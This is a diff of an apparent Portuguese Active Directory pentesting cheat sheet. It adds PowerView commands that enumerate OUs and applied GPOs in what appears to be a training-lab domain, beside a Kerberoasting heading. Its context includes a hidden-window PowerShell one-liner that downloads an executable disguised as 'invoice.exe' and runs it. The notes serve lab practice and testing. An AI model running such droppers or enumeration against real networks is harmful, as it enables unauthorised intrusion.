@@ -2514,8 +2514,13 @@ CRIAR SPN , SOLICITAR TICKET E QUEBRAR A SENHA (KERBEROASTING)
 ```
 powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'
 ```
-
 ## POWERVIEW OLD
+##### POWERVIEW OLD - VERIFICAR QUAL GPO É APLICADA EM UMA OU 
+```
+Get-Netou -OUName StudentMachines | %{Get-NetComputer -ADSPath $_}
+Get-NetGPO -ADSpath 'LDAP://cn={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local'
+Get-NetGPO -ADSpath 'LDAP://cn={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local' | select name, displayname
+```
 ##### POWERVIEW OLD - VERIFICAR ACL DE GRUPOS E USUARIOS DO AD:
 ```
 Get-ObjectAcl -samaccountname "users" -ResolveGUIDs -Verbose
